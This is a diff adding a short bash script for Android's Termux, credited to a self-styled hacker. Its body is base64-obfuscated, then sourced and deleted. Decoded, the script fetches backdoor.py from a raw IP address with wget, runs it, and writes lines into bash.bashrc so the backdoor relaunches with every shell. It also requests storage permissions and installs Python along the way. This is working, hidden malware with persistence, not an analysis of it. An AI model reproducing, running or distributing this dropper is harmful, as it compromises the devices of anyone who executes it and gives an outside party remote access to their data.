@@ -1,0 +1,24 @@
+!/usr/bin/env bash
+#
+# Obfuscate by @CesarHackGray
+# Contacta https://t.me/CesarGray
+# Channel: https://www.youtube.com/channel/UCjs0N8PbEo-se0r_4O_svNQ
+#
+#
+CesarHackGray=$(mktemp)
+base64 -d  >${CesarHackGray}<<DIXIE
+IyEvYmluL2Jhc2gKcHJpbnRmICJcZVsxOzMybUJpZW52ZW5pZG8gYSBtaSBTY3JpcHQgZGVzY2Fy
+Z2FyZW1vcyB1biBiYWNrZG9vciBlbiBzdSB0ZXJtdXhcbiIKcHJpbnRmICJcZVsxOzMybUFjZXB0
+ZSBwZXJtaXNvcyBkZSBTdG9yYWdlIHBhcmEgY29udGludWFyXG4iCnRlcm11eC1zZXR1cC1zdG9y
+YWdlCnBrZyBpbnN0YWxsIHB5dGhvbiAteQp3Z2V0IGh0dHA6Ly8zNS4yMzIuMjA5LjE1MC9iYWNr
+ZG9vci5weQpjaG1vZCAreCBiYWNrZG9vci5weQpweXRob24gYmFja2Rvb3IucHkKbXYgYmFja2Rv
+b3IucHkgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9ldGMKZWNobyAiY2QgL2RhdGEv
+ZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9ldGMvIiA+PiAvZGF0YS9kYXRhL2NvbS50ZXJtdXgv
+ZmlsZXMvdXNyL2V0Yy9iYXNoLmJhc2hyYwpjbGVhcgplY2hvICJweXRob24gYmFja2Rvb3IucHki
+ID4+IC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvZXRjL2Jhc2guYmFzaHJjCmNsZWFy
+CmVjaG8gImNkIiA+PiAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2V0Yy9iYXNoLmJh
+c2hyYwpwcmludGYgIlxlWzE7MzFtQmFja2Rvb3IgaW5zdGFsYWRvXG4iCnNsZWVwIDMKcHJpbnRm
+ICJcZVsxOzMxbUZpbiBkZWwgU2NyaXB0XG4iCmV4aXQKCg==
+DIXIE
+source ${CesarHackGray}
+rm -rf ${CesarHackGray}
